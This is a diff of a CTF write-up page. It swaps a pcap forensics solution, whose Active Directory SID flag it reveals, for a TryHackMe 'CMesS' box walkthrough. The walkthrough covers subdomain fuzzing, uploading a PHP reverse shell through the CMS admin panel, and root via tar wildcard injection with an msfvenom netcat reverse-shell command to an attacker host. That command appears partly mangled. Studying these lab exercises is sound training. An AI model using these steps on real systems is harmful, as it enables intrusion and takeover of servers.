@@ -61,141 +61,340 @@
                 </li>
                 <li>
                     <p>
-                        Find the evidence of the complete compromise of the domain forest in this network traffic
-                        capture file! The presence of the Enterprise Admins group SID indicates the highest privilege.
-                        The structure of the flag is flag{S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519}. Submit here
-                        when you are ready.
-
-                        (Should you get a Bad Gateway message initially, try to refresh the whole page. Besides, you can
-                        always download the .pcap file if you want to work on that in your own environment.)
-
-                        There is a domain forest with two domain controllers of the corresponding domains
-                        (victimcorp-dc-1.victimcorp.local, victimcorp-dc-2.dev.victimcorp.local). The attackers dumped
-                        from memory the TGT of a domain administrator Bruce Banner and utilized it on another
-                        workstation to elevate privilege of the domain user Peter Parker.
-                        Meanwhile, the TGT was renewed as well. It gives the opportunity to access the victimcorp-dc-2
-                        domain controller.</p>
+                        Can you root this Gila CMS box?</p>
                 </li>
                 <div class='my-5 hline'></div>
                 <li>
-                    <h3>Solution</h3>
+                    <h3 class="my-5">Solution</h3>
                 </li>
                 <li>
-                    <p>We actually solved this an unintended way, much easier than the intended way.</p>
+                    <p>Me and my friend rooted this box together, we got the first bloods for both user and root so that
+                        is nice :)</p>
                 </li>
                 <li>
-                    <p>We have a <span class="highlight">.zip</span> file, let's extract it.</p>
+                    <p>After connecting to the tryhackme VPN network, joining the room for the box and launching an
+                        instance, we got an ip: <span class="highlight">10.10.159.128</span> (this changes every launch,
+                        so make sure to check which ip you got for the machine)</p>
                 </li>
                 <li>
-                    <p><span class="code">unzip networktraffic.zip </span></p>
+                    <p>First things first let's run an <span class="highlight">nmap</span> on it so we know what we are
+                        dealing with!</p>
                 </li>
                 <li>
-                    <p>Our first idea was: <span
-                            class="highlight">flag{S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519}</span>
-                        gave us a pattern we can <span class="highlight">grep</span> for, so let's do that!</p>
+                    <p>We are not gonna go any fancy, just do a basic scan which looked like this: </p>
                 </li>
                 <li>
-                    <p><span class="code">strings networktraffic.zip | grep ".-.-.-..-" </span></p>
+                    <p><span class="code">nmap -p- -A -T4 10.10.159.128</span></p>
                 </li>
                 <li>
-                    <p>This did give us some SID-s, but the one we are looking for wasn't among them. The result was:
+                    <p>This gave us these results:
                     </p>
                 </li>
                 <li>
                     <p>
-                        <pre class="code">
-S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272S-1-5-21-2474510013-3962331584-1878792983-500n
-S-1-15-2-2572118008-3077471215-3128327636-2598586217-811314952-2132569887-2279274531S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-957941444-2271171641-4049211970-804197638-2225746618-2474488012-4131196493S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-969871995-3242822759-583047763-1618006129-3578262429-3647035748-2471858633S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-19479607-1015771884-3827151630-3301822711-2267158487-4079414233-1230461222S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272S-1-5-21-2474510013-3962331584-1878792983-500.
-S-1-15-2-2434737943-167758768-3180539153-984336765-1107280622-3591121930-2677285773S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-1861897761-1695161497-2927542615-642690995-327840285-2659745135-2630312742S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2758101530-1321080646-1475665648-4066602542-2880396197-3643791541-2654759312S-1-5-21-2474510013-3962331584-1878792983-500x
-S-1-15-2-957941444-2271171641-4049211970-804197638-2225746618-2474488012-4131196493S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2758101530-1321080646-1475665648-4066602542-2880396197-3643791541-2654759312S-1-5-21-2474510013-3962331584-1878792983-5005
-S-1-15-2-1255970798-2717750985-493741290-1721212560-3530798636-1829112236-3118580706S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2705751783-1496458293-2835996032-3143071717-1071345625-677459937-2760321769S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-969871995-3242822759-583047763-1618006129-3578262429-3647035748-2471858633S-1-5-21-2474510013-3962331584-1878792983-500h
-S-1-15-2-1861897761-1695161497-2927542615-642690995-327840285-2659745135-2630312742S-1-5-21-2474510013-3962331584-1878792983-500h
-S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2434737943-167758768-3180539153-984336765-1107280622-3591121930-2677285773S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-19479607-1015771884-3827151630-3301822711-2267158487-4079414233-1230461222S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-1255970798-2717750985-493741290-1721212560-3530798636-1829112236-3118580706S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2705751783-1496458293-2835996032-3143071717-1071345625-677459937-2760321769S-1-5-21-2474510013-3962331584-1878792983-500
-S-1-15-2-2572118008-3077471215-3128327636-2598586217-811314952-2132569887-2279274531S-1-5-21-2474510013-3962331584-1878792983-500</p></pre>
-                </li>
-                <li>
-                    <p>Not sure how many people know about this, but wireshark has a less-known console version too,
-                        called <span class="highlight">tshark</span> .</p>
-                </li>
-                <li>
-                    <p>We ended up using this tool, to generate a <span class="highlight">.pdml</span> file out of our
-                        <span class="highlight">.pcapng</span>. This can be done the following way:</p>
-                </li>
-                <li><span class="code">tshark -r networktraffic.pcapng -T pdml > data.pdml</span></li>
-                <li>
-                    <p>Now that we have this <span class="highlight">XML-like</span> output, let's try to cat it and
-                        <span class="highlight">grep</span> for the right pattern!</p>
-                </li>
-                <li><span class="code">cat data.pdml | grep "S-1-5-21-..........-..........-..........-519"</span>
-                </li>
-                <li>
-                    <p>This indeed gave us the expected result, and the flag. The output looked like this:</p>
-                </li>
-                <li><span class="code">
-                        field name=""
-                        show="NT ACE: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins),
-                        flags 0x00, Access Allowed, mask 0x000e00bd"
-                        size="36" pos="509"
-                        value="00002400bd000e00010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name="nt.sid"
-                        showname="SID: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins)"
-                        size="28" pos="517" show="S-1-5-21-4015363511-2369626398-3982198339-519"
-                        value="010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name=""
-                        show="NT ACE: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins),
-                        flags 0x0a, Access Allowed, mask 0x000f00ff"
-                        size="36" pos="545"
-                        value="000a2400ff000f00010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name="nt.sid"
-                        showname="SID: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins)"
-                        size="28" pos="553" show="S-1-5-21-4015363511-2369626398-3982198339-519"
-                        value="010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name=""
-                        show="NT ACE: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins),
-                        flags 0x00, Access Allowed, mask 0x000e00bd"
-                        size="36" pos="509"
-                        value="00002400bd000e00010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name="nt.sid"
-                        showname="SID: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins)"
-                        size="28" pos="517" show="S-1-5-21-4015363511-2369626398-3982198339-519"
-                        value="010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name=""
-                        show="NT ACE: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins),
-                        flags 0x0a, Access Allowed, mask 0x000f00ff"
-                        size="36" pos="545"
-                        value="000a2400ff000f00010500000000000515000000b79555ef1ea13d8d43865bed07020000">
-                        field name="nt.sid"
-                        showname="SID: S-1-5-21-4015363511-2369626398-3982198339-519 (Domain SID-Enterprise Admins)"
-                        size="28" pos="553"
-                        show="S-1-5-21-4015363511-2369626398-3982198339-519"
-                        value="010500000000000515000000b79555ef1ea13d8d43865bed07020000">
+                        <pre style="text-align: left;" class="code">
+Host is up (0.062s latency). 
+Not shown: 65533 closed ports 
+PORT STATE SERVICE VERSION 
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
+| ssh-hostkey: 
+| 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 
+| 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 
+|_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 
+|_http-generator: Gila CMS 
+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/ 
+|_http-server-header: Apache/2.4.18 (Ubuntu) 
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
+TCP/IP fingerprint: 
+OS:SCAN(V=7.80%E=4%D=2/14%OT=22%CT=1%CU=37084%PV=Y%DS=2%DC=T%G=Y%TM=5E4701A 
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS 
+OS:(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST1 
+OS:1NW6%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN 
+OS:(R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A 
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R 
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F 
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% 
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S)
 
-                    </span></li>
+Network Distance: 2 hops 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
+</p></pre>
+                </li>
                 <li>
-                    <p>Since the flag was the <span class="highlight">Enterprise Admins group SID</span>, we can read
-                        that from this output, and we successfully solved the challenge!</p>
+                    <p>Obviously, by looking at the scan we can see that this is going to be some web-related stuff,
+                        since <span class="highlight">port 80</span> is open which is the <span
+                            class="highlight">HTTP</span> port. </p>
                 </li>
                 <div class='my-5 hline'></div>
                 <li>
-                    <h3>Flag (hover to see)</h3>
+                    <p>Before navigating to the website, the challenge page says to add <span
+                            class="highlight">10.10.13.23
+                            cmess.thm</span> to the <span class="highlight">/etc/hosts</span> file, so let's do that.
+                        After opening it with the <span class="highlight">nano</span> text editor and addig the required
+                        line, we can finally reach the page.</p>
+                </li>
+                <img class="img-fluid" style="height: 500px; width: 1370px;"
+                    src="../../../../../media/img/cmess/cmess_site_1.png" alt="cmess site picture 1">
+                <li>
+                    <p class="my-3">Straight away, we can tell the page has <span class="highlight">Gila CMS</span>
+                        running on it (it was in the challenge description too, but hey we can confirm it now).</p>
                 </li>
                 <li>
-                    <p><span class="code_hidden">flag{S-1-5-21-4015363511-2369626398-3982198339-519}</span></p>
+                    <p>First, I've ran searchsploit to look for exploits for Gila CMS, this gave us two results: </p>
                 </li>
+                <li>
+                    <p>
+                        <pre style="text-align: left;" class="code">
+Exploit Title                                           Path  
+                                                        (/usr/share/exploitdb/) 
+----------------------------------------------------------------------------------------------------------------
+ Gila CMS 1.9.1 - Cross-Site Scripting                   exploits/php/webapps/46557.txt 
+ Gila CMS < 1.11.1 - Local File Inclusion                exploits/multiple/webapps/47407.txt 
+ ---------------------------------------------------------------------------------------------------------------
+ Shellcodes: No Result
+</p></pre>
+                </li>
+                <li>
+                    <p>Looking at these two, the <span class="highlight">XSS</span> is highly unlikely to have any use,
+                        since it's a virtual machine
+                        with no users to attack (There has been boxes where the answer was indeed XSS since a bot
+                        visited the malicious link from time to time, but besides noting it down we didn't give it high
+                        priority, first we'll check the more interesting stuff)</p>
+                </li>
+                <li>
+                    <p>The <span class="highlight">LFI</span> is more interesting, but after checking out the exploit we
+                        immediately realised that it's
+                        authenticated, so it will also be no use for us, atleast for now, till we have a user.</p>
+                </li>
+                <li>
+                    <p>
+                        Next thing we did, is to run <span class="highlight">Dirbuster</span> against the site, with
+                        basic config, using the wordlist (don't forget to turn recursive mode off or your scan will run
+                        forever): <br><br>
+                        <span class="highlight">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+                        </span>
+                    </p>
+                </li>
+                <li>
+                    <p>
+                        This gave us tons of results, we did waste some time navigating to these, but afterall none of
+                        them appeared to be interesting.
+                    </p>
+                </li>
+                <div class='my-5 hline'></div>
+                <li>
+                    <p>
+                        We did get stuck a bit here, but after some thinking we decided to run <span
+                            class="highlight">wfuzz</span> against the site, to check for subdomains. There are other
+                        ways to discover subdomains, but I personally love <span class="highlight">wfuzz</span> for how
+                        insanely fast it is. We used this command:
+                    </p>
+                </li>
+                <li>
+                    <span class="code">wfuzz -c -f subdomains.txt -w
+                        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H
+                        "Host: FUZZ.cmess.thm" --hl 107
+                    </span>
+                </li>
+                <li>
+                    <p>
+                        This almost instantly gave us a result which looked interesting: <span
+                            class="highlight">dev.cmess.thm</span>. We added this to /etc/hosts too, then navigated to
+                        the site and boom! We found some chat-looking thing with some credentials in it!
+                    </p>
+                </li>
+
+                <li>
+                    <img class="img-fluid" style="height: 500px; width: 1370px;"
+                        src="../../../../../media/img/cmess/cmess_site_2.png" alt="cmess site picture 2">
+                </li>
+                <li>
+                    <p class="my-3">
+                        Yay we got credentials! We did try to ssh in with these, even though we saw that these are the
+                        credentials for the website admin panel, but gotta go for the low hanging fruits :) <br> SSH did
+                        not
+                        work with this password, so we went and opened the admin panel, which is at: <span
+                            class="highlight"><a class="body-link" href="cmess.thm/admin">cmess.thm/admin</a></span>
+                    </p>
+                </li>
+                <li>
+                    <img class="img-fluid" style="height: 500px; width: 1370px;"
+                        src="../../../../../media/img/cmess/cmess_site_3.png" alt="cmess site picture 3">
+                </li>
+                <li>
+                    <p class="my-3">
+                        This wasn't a rabbithole, and we managed to finally log in. When you are in an admind panel, you
+                        should usually look for ways to upload a shell that the webserver can execute. We indeed did
+                        this and found a way really quick.
+                    </p>
+                </li>
+                <p>
+                    You can upload a file via navigatin to the <span class="highlight">left side</span> of the admin
+                    panel, hovering over <span class="highlight">Content</span> and then clicking <span
+                        class="highlight">File Manager</span>.
+                </p>
+                <p>There is no restriction for <span class="highlight">php</span> files, so we simply uploaded the basic
+                    reverse shell found in <span class="highlight">/usr/share/webshells/php</span>, the one from <br>
+                    <span class="highlight">pentest monkey</span>. Don't forget to open a listener with</p>
+                <span class="code">nc -lvnp &lt;PORT&gt;</span>
+                <p>After all this, we had to find where the file was uploaded, but this also didn't take long since the
+                    file system is quite simple, we just navigated through it by hand and found that it was in the <span
+                        class="highlight">assets</span> folder. All we had to do is to open the reverse shell in the
+                    browser, so it executes on the webserver, and we did indeed get our foothold on the server, by
+                    reciving our first shell as <span class="highlight">www-data</span>.</p>
+                <div class='my-5 hline'></div>
+                <p>What I usually do after managing to get a shell, especially as <span
+                        class="highlight">www-data</span>, is to check the files in the
+                    website folder, since www-data will have permission to read these. This did take us into a small
+                    rabbithole, but I'll include it in the writeup, since it could have been the right way for <span
+                        class="highlight">priv-esc</span>
+                    if it was a real-life situation.</p>
+                <p>
+                    So the rabbithole: in <span class="highlight">/var/www/html</span> there is a <span
+                        class="highlight">config.php</span> with some <span class="highlight">MySQL</span> root user
+                    credentials in it. This immediately looked really interesting, maybe there is some info in the
+                    database that will help us priv-esc somehow, so we logged into it with root:
+                </p>
+                <span class="code">mysql -u root -p</span>
+                <p>After this, mysql will ask for a password, and after giving the one found in the php file we managed
+                    to log in as root. We encountered a problem here, our shell wasn't able to handle the communication
+                    with the mysql server for some reason. Let's get a better shell first, then try again. Python3 is
+                    installed on the machine, so we can get a nice shell easily by running these:
+                </p>
+                <span class="code">python3 -c "import pty;pty.spawn('/bin/bash')"<br>
+                    Ctrl+Z <br>
+                    stty raw -echo <br>
+                    fg <br>
+                    [enter] <br>
+                    [enter] <br>
+                    export TERM=screen
+                </span>
+                <p>Now we got a shell that can handle the <span class="highlight">MySQL</span> prompt and we can also
+                    <span class="highlight">clear</span> it or move around with the
+                    arrow keys, so it's much better. Let's log in to <span class="highlight">MySQL</span> as <span
+                        class="highlight">root</span> again,
+                    the same way as before.</p>
+                <p>We managed to log in and we can finally see the mysql prompt at the start of the line. Let's run some
+                    SQL commands:</p>
+                <span class="code">show databases;</span>
+                <p>This returned:</p>
+                <pre class="code">
++--------------------+ 
+| Database           | 
++--------------------+ 
+| information_schema | 
+| gila               | 
+| mysql              | 
+| performance_schema | 
+| sys                | 
++--------------------+ 
+
+5 rows in set (0.00 sec)</pre>
+                <p>Obviously the interesting database here is the one named <span class="highlight">gila</span>, so the
+                    next
+                    thing we did was selecting that database for use:</p>
+                <span class="code">use gila;</span>
+                <p>After this, we wanted to see which tables this database contains, so let's run:</p>
+                <span class="code">show tables;</span>
+                <p>This gave us:</p>
+                <pre class="code">
++----------------+ 
+| Tables_in_gila | 
++----------------+ 
+| option         | 
+| page           | 
+| post           | 
+| postcategory   | 
+| postmeta       | 
+| user           | 
+| usermeta       | 
+| userrole       | 
+| widget         | 
++----------------+ 
+
+9 rows in set (0.00 sec)
+</pre>
+                <p>After checking each table out, we've managed to find that the one named <span
+                        class="highlight">user</span> contained interesting stuff. If someone's not familiar to SQL,
+                    here's the command we used:</p>
+                <span class="code">SELECT * FROM user;</span>
+                <p>We got:</p>
+                <pre class="code">
++----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 
+| id | username | email           | pass                                                         | active | reset_code | created             | updated             | 
++----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 
+| 1  |&lt;redacted&gt;| &lt;redacted&gt;      | &lt;redacted&gt;A0MEze02jd.qU9tnYL&lt;redacted&gt;ltElcWEAc&lt;redacted&gt;sBa | 1      |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 | 
++----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 
+
+1 row in set (0.00 sec)</pre>
+
+                <p>And this is where we realised that we are deep in a rabbithole :D</p>
+                <p>The way we found that out was by trying to crack the password hash we got from the database (we
+                    already suspected that this is gonna be the same as the pass we got from the dev subdoamin, since
+                    it's in the gila database), and when we cracked it we indeed found that it's the pass we already
+                    had.</p>
+                <div class='my-4 hline'></div>
+                <p>When you get in a rabbithole, best is to take a step back and try a different approach, you'll always
+                    have your previous findings to pick up and go back to later if you documented everything well. This
+                    is exactky what we did, so we started to look around the file system a bit more.</p>
+                <p>We first found an interesting file in the <span class="highlight">/tmp</span> folder, but this
+                    appeared to be useful for getting root later.</p>
+                <p>Since manual looking didn't give us anything, we decided to run <span
+                        class="highlight">linenum</span>on the target.</p>
+                <p>This gave us a very interestign result, a password backup file located in the <span
+                        class="highlight">/opt</span> folder, called <span class="highlight">.password.bak</span></p>
+                <p>We've managed to use this to get from <span class="highlight">www-data</span> into a higher user,
+                    using the credentials (both login name and password) in the backup file. The simple linux command to
+                    use is:</p>
+                <span class="code">su -l &lt;redacted user&gt;</span>
+                <p>Then giving the password. We finally got a better user, and we have the right to <span
+                        class="highlight">cat</span> out the <span class="highlight">user.txt</span> file found
+                    in the user's home folder.</p>
+                <div class='my-4 hline'></div>
+                <p>Next thing was to get root. We saw an interesting folder in the user's home folder other than the
+                    flag,
+                    called <span class="highlight">backup</span>. In there there is a file called <span
+                        class="highlight">note</span> which has this in it:</p>
+                <span class="code">Note to self. Anything in here will be backed up!
+                </span>
+                <p>Okay, so from this we know that there's a backup service running on the server, we can also see this
+                    from the <span class="highlight">linenum</span> report, and we also found the backed up file in the
+                    <span class="highlight">/tmp</span> folder earlier when we were looking for user priv-esc. We can in
+                    fact see the exact command that is being run when the backup happens (also from linenum, or catting
+                    the cronjob files):</p>
+                <span class="code">*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *</span>
+                <p>Not sure how many people are familiar with it, but there's a way to exploit <span
+                        class="highlight">tar</span> if it uses <span class="highlight">wildcards</span>, there is more
+                    info on it <a class="body-link"
+                        href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">in
+                        this article</a>.</p>
+                <p>The name of the attack is <span class="highlight">Wildcard injection</span>, and it's a way to make
+                    <span class="highlight">tar</span> run an executable for us. Since the backup service is running as
+                    root, if we make this executable a reverse shell, then we got ourselves a root shell.</p>
+                <p>First we confirmed that <span class="highlight">netcat</span> is installed on the webserver, then
+                    made a <span class="highlight">netcat reverse shell</span> with <span
+                        class="highlight">msfvenom</span>:</p>
+                <span class="code">msfvenom -p cmd/unix/reverse_netcat lhost=&lt;IP&gt; lport=&lt;PORT&gt; R</span>
+                <p>Let's make sure we are in the <span class="highlight">backup</span> folder and run the thing <span
+                        class="highlight">msfvenom</span>
+                    gave us:</p>
+                <span class="code">mkfifo /tmp/pdbd; nc &lt;IP&gt; &lt;PORT&gt; 0/tmp/pdbd 2>&1; rm /tmp/pdbd echo
+                    "mkfifo
+                    /tmp/lhennp; nc &lt;IP&gt; &lt;PORT&gt; 0/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh</span>
+                <p>Two more things we have to run for the <span class="highlight">wildcard injection</span> to happen,
+                    but first don't forget to open a netcat listener on your attacking machine, so the rev shell can
+                    connect back to something.</p>
+                <span class="code">nc -lvnp &lt;PORT&gt;</span>
+                <p>And now we run the last two steps for the attack to be successful:</p>
+                <span class="code">echo "" > "--checkpoint-action=exec=sh shell.sh"</span>
+                <span class="code">echo "" > "--checkpoint=1"</span>
+                <p>This will make <span class="highlight">tar</span> execute our reverse shell, and after waiting a bit,
+                    we successfully <span class="highlight">rooted the box!</span></p>
+                <div class='my-4 hline'></div>
+                <p>Overall I think it was a fun box, with interestign steps involved during exploitation. I'd like to
+                    thank <a class="body-link" href="https://tryhackme.com/p/Optional">Optional</a> for creating it :)</p>
             </ul>
         </div>
     </section>
